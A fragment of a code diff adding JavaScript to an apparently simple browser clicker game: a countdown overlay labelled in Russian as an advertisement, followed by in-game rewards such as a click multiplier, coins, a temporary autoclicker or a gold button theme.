+            const adOverlay = document.createElement('div');
+            adOverlay.style.cssText = `
+                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(0,0,0,0.9); z-index: 1000;
+                display: flex; flex-direction: column; align-items: center; justify-content: center;
+                color: #fff; font-size: 20px;
+            `;
+            adOverlay.innerHTML = `
+                <div style="font-size: 64px; margin-bottom: 20px;">📺</div>
+                <div>Реклама...</div>
+                <div id="adTimer" style="font-size: 48px; font-weight: bold; margin: 20px 0;">3</div>
+                <div style="font-size: 14px; opacity: 0.6;">Награда после просмотра</div>
+            `;
+            document.body.appendChild(adOverlay);
+            
+            let sec = 3;
+            const timerEl = document.getElementById('adTimer');
+            const countdown = setInterval(() => {
+                sec--;
+                timerEl.textContent = sec;
+                if (sec <= 0) {
+                    clearInterval(countdown);
+                    adOverlay.remove();
+                    giveReward(reward);
+                }
+            }, 1000);
+        }
+        
+        function giveReward(reward) {
+            switch(reward) {
+                case 'premium':
+                    clickMultiplier = 3;
+                    updateScore();
+                    setTimeout(() => { clickMultiplier = 1; updateScore(); }, 30000);
+                    alert('🎁 x3 сила клика на 30 секунд! Перейди в Кликер.');
+                    switchTab('clicker');
+                    break;
+                case 'coins':
+                    score += 50;
+                    updateScore();
+                    alert('🪙 +50 монет добавлено в Кликер!');
+                    switchTab('clicker');
+                    break;
+                case 'autoclick':
+                    if (autoClickInterval) clearInterval(autoClickInterval);
+                    autoClickInterval = setInterval(() => { score += clickMultiplier; updateScore(); }, 100);
+                    setTimeout(() => { clearInterval(autoClickInterval); }, 10000);
+                    alert('🤖 Автокликер на 10 секунд! Перейди в Кликер.');
+                    switchTab('clicker');
+                    break;
+                case 'theme':
+                    clickerBtn.style.background = 'linear-gradient(135deg, #ffd700, #ff8c00)';
+                    alert('🎨 Золотая кнопка активирована!');
+                    break;
+            }
+        }
+    </script>
 </body>
 </html>
